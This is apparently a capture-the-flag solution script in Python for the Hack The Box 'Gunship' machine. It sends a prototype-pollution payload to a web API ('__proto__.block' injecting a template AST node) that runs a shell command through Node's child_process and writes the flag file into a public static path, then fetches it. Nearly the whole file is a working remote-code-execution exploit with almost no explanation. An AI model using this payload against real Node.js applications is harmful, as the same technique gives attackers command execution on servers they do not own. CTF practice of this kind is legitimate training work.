import requests


#this code is going to explote an inflatten AST injection vulnerability on gunship machin in hack the box
#!/usr/bin/python
ENDPOINT = 'http://138.68.131.63:30968/api/submit'
OUTPUT = 'http://138.68.131.63:30968/static/out'
#inflatten code injection leads to RCE:
request = requests.post(ENDPOINT, json = {
   "artist.name":"Gingell",
       "__proto__.block": {
           "type":"Text",
           "line":"process.mainModule.require('child_process').execSync('cat flagq5wYh > /app/static/out')"
       }
})
print (request.text)
print (requests.get(OUTPUT).text)
